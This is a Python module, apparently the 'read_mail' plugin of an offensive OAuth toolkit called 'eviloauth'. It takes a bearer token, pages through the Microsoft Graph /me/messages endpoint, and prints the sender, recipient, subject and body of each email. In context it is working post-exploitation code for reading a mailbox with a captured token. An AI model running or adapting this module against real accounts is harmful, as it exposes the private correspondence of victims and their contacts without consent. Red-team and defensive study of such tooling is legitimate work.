import logging
import requests
import html2text
from eviloauth.exceptions import EviloauthModuleException


def print_normal(emails, email_count):
    count = 0
    for email in emails:
        count += 1
        if count > email_count and email_count != -1:
            break
        print(email)


def print_html(emails, email_count):
    count = 0
    for email in emails:
        count += 1
        if count > email_count and email_count != -1:
            break

        from_email = email['from']['emailAddress']['address']
        from_name = email['from']['emailAddress']['name']
        to_email = email['toRecipients'][0]['emailAddress']['address']
        subject = email['subject']
        body = html2text.html2text(email['body']['content'])

        print('=========================================')
        print(f'From: {from_name} <{from_email}>')
        print(f'To: {to_email}')
        print(f'Subject: {subject}')
        print(f'Body: {body}')
        print('=========================================')


def print_emails(emails, email_count, mode='html'):
    if mode == 'normal':
        print_normal(emails, email_count)
    elif mode == 'html':
        print_html(emails, email_count)


def __load__():
    print('LOADED read_mail')
    pass


def __run__(general_token):
    print('RUNNING read_mail')

    if not general_token:
        print("Error: No general token provided.")
        return

    email_count = 10

    graph_url = 'https://graph.microsoft.com/v1.0/me/messages'
    graph_headers = {
        'Authorization': f'Bearer {general_token}',
    }

    emails = []

    try:
        while True:
            graph_response = requests.get(graph_url, headers=graph_headers)

            if graph_response.status_code != 200:
                print(f"Error fetching emails: {
                      graph_response.status_code} - {graph_response.text}")
                break

            emails_resp = graph_response.json()
            emails_value = emails_resp.get('value')
            emails_next_link = emails_resp.get('@odata.nextLink')

            if emails_value:
                emails.extend(emails_value)
            else:
                print("No more emails to fetch.")
                break

            if not emails_next_link or (
                    email_count != -1 and len(emails) >= email_count):
                break

            graph_url = emails_next_link

        if emails:
            print_emails(emails, email_count)
        else:
            print("No emails found.")

    except Exception as e:
        print(f"An error occurred: {e}")
